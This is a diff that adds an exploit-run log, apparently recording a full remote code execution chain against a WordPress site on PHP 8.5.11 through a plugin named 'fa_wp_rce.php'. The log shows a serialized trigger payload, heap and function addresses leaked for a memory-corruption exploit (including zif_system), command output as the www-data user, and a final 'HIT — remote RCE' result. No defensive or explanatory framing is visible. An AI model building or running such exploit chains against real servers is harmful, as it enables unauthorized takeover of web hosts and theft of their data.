@@ -1,0 +1,15 @@
+========================================================================
+fa MISSION 1 — full zero4 chain through WordPress HTTP
+target https://respectively-donna-butter-specialty.trycloudflare.com  (Apache mod_php, PHP 8.5.11)
+========================================================================
+[install] already installed
+[plugin] active_plugins=a:1:{i:0;s:23:"fa-import/fa_wp_rce.php";}
+[surface] 200 <br />
+<b>Warning</b>:  Cannot modify header information - headers already sent in <b>/var/www/html/wp-includes/rest-api/class-wp-rest-server.php</b> on line <b
+[weapon] trigger bytes=10132 (a:1020 with Stage1 dup-key object)
+[shot g=0] status=520 len=16 RCE=no
+        error code: 520
+[marker-followup] uid=33(www-data) gid=33(www-data) groups=33(www-data)
+[receipt-route] 200 "[fa-receipt] PHP 8.5.11 sapi=apache2handler\n[MARKER]\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n[DIAG]\nM1 block2 = 0x7813f1096000\nM2 T_u5=0x7813f1098060 T_u13=0x7813f10980e0 spacing=128\nM2 ORACLE1=0x7813ef49cee0 ORACLE2=0x7813ef49cee0\nM2-DONE base=0x7813ede00000 zif_system=0x7813ee3996e0\nM3-STR strlen=8160\nM3 string reclaim OK (canaries verified at block2)\nM3 BASE verified vi
+[marker-file] 200 uid=33(www-data) gid=33(www-data) groups=33(www-data)
+[RESULT] HIT — remote RCE through WordPress HTTP
